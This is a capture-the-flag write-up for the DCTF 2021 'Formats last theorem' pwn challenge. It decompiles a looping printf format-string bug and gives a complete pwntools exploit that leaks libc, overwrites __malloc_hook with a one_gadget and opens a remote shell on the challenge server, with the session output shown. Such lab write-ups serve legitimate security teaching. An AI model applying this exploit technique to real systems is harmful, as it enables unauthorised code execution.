# DCTF 2021

## Formats last theorem

> 400
> 
> I dare you to hook the malloc
> 
> `nc dctf-chall-formats-last-theorem.westeurope.azurecontainer.io 7482`
>
> [formats\_last\_theorem](formats_last_theorem) [Dockerfile](Dockerfile)

Tags: _pwn_ _x86-64_ _malloc_ _malloc-hook_ _write-what-where_ _format-string_


## Summary

The challenge description turned this into a 5-minute challenge.  Without this hint, I think many would have been lost in an endless loop.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations in place sans canary, but since there's no `return`, it does not matter.


### Decompile with Ghidra

```c
void vuln(void)
{
  long in_FS_OFFSET;
  char local_78 [104];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  do {
    puts("I won\'t ask you, what your name is. It\'s getting kinda old at this point");
    __isoc99_scanf("%100s",local_78);
    puts("you entered");
    printf(local_78);
    puts("");
    puts("");
  } while( true );
}
```

Endless loop with endless format-string exploits.

The plan is simple, use `printf` to leak libc, then, per the challenge description, use `printf` _hook the malloc_, and then `printf` again to [trigger the hook](http.s://github.com/Naetw/CTF-pwn-tips#use-printf-to-trigger-malloc-and-free).


> The libc version was provided in the form of a `Dockerfile`.  I've included it (`libc.so.6`) as part of this writeup since a future update to Ubuntu 18.04 may change the version of libc.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./formats_last_theorem')

if args.REMOTE:
    p = remote('dctf-chall-formats-last-theorem.westeurope.azurecontainer.io', 7482)
    libc = ELF('./libc.so.6')
else:
    import signal
    p = process(('stdbuf -i0 -o0 -e0 '+binary.path).split(),preexec_fn=lambda: signal.signal(signal.SIGALRM, signal.SIG_IGN))
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# one_gadget
libc.symbols['gadget'] = [0x4f3d5, 0x4f432, 0x10a41c][1]
```

> one_gadget if available is the easy win here.  The second of the three possible options works just fine.

Standard pwntools setup, however I added `gadget` symbol to libc, and have my local process ignoring SIGALRM.

> No `setvbuf` in challenge binary, so I had to prepend `stdbuf`.

```python
p.sendlineafter('point\n','%23$p')
p.recvuntil('entered\n')
__libc_start_main = int(p.recvline().strip(),16) - 231
libc.address = __libc_start_main - libc.sym.__libc_start_main
log.info('libc.address: ' + hex(libc.address))
```

The above provides the leak, _but why `23`?_

To find libc in the stack and leak it just use GDB (with an Ubuntu 18.04 machine/container, see the challenge included [Dockerfile](Dockerfile)):

```
0x00007fffffffe300│+0x0000: 0x0000000070243625 ("%6$p"?)	 ← $rsp, $rdi
0x00007fffffffe308│+0x0008: 0x0000000000000000
0x00007fffffffe310│+0x0010: 0x0000000000000000
0x00007fffffffe318│+0x0018: 0x0000000000000000
0x00007fffffffe320│+0x0020: 0x0000000000000009
0x00007fffffffe328│+0x0028: 0x00007ffff7dd5660  →  <dl_main+0> push rbp
0x00007fffffffe330│+0x0030: 0x00007fffffffe398  →  0x00007fffffffe468  →  0x00007fffffffe6e0  →  "/pwd/datajerk/dctf2021/formats_last_theorem/format[...]"
0x00007fffffffe338│+0x0038: 0x0000000000f0b5ff
0x00007fffffffe340│+0x0040: 0x0000000000000001
0x00007fffffffe348│+0x0048: 0x000055555540081d  →  <__libc_csu_init+77> add rbx, 0x1
0x00007fffffffe350│+0x0050: 0x00007ffff7de3b40  →  <_dl_fini+0> push rbp
0x00007fffffffe358│+0x0058: 0x0000000000000000
0x00007fffffffe360│+0x0060: 0x00005555554007d0  →  <__libc_csu_init+0> push r15
0x00007fffffffe368│+0x0068: 0xb049ba36a07c5200
0x00007fffffffe370│+0x0070: 0x00007fffffffe380  →  0x00005555554007d0  →  <__libc_csu_init+0> push r15	 ← $rbp
0x00007fffffffe378│+0x0078: 0x00005555554007c4  →  <main+24> mov eax, 0x0
0x00007fffffffe380│+0x0080: 0x00005555554007d0  →  <__libc_csu_init+0> push r15
0x00007fffffffe388│+0x0088: 0x00007ffff7a03bf7  →  <__libc_start_main+231> mov edi, eax
```

Before counting down to `__libc_start_main+231` for the leak, you'll need to know the offset, to find that just send `%nn$p` where `nn > 0`, and keep incrementing `nn` until the output matches the intput, e.g.:

```
I won't ask you, what your name is. It's getting kinda old at this point
%6$p
you entered
0x70243625
```

It's a match, the offset is `6`.  That'd put `__libc_start_main+231` at parameter `23` (look at the stack above and just count down).

With libc location known, all that is left is to _hook the malloc_:

```python
p.sendlineafter('point\n',fmtstr_payload(6,{libc.sym.__malloc_hook:libc.sym.gadget},write_size='short'))
p.sendlineafter('point\n','%65537c')
p.recvuntil('entered\n')
p.interactive()
```

Standard pwntools format-string to set the hook with our gadget.  The `write_size='short'` reduces the size of the payload from 120 bytes to 64 (we only have 100 bytes to work with).

After the hook set, just `printf` something large to trigger it.

> If you're new to format-string exploits read this: [Exploiting Format String Vulnerabilities](https://cs155.stanford.edu/papers/formatstring-1.2.pdf).
>
> Many examples of how to use pwntools `fmtstr_payload`: [dead-canary](https://github.com/datajerk/ctf-write-ups/tree/master/redpwnctf2020/dead-canary).

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/dctf2021/formats_last_theorem/formats_last_theorem'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to dctf-chall-formats-last-theorem.westeurope.azurecontainer.io on port 7482: Done
[*] '/pwd/datajerk/dctf2021/formats_last_theorem/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7f22bb2f8000
[*] Switching to interactive mode
$ id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ cat flag.txt
dctf{N0t_all_7h30r3ms_s0und_g00d}
```
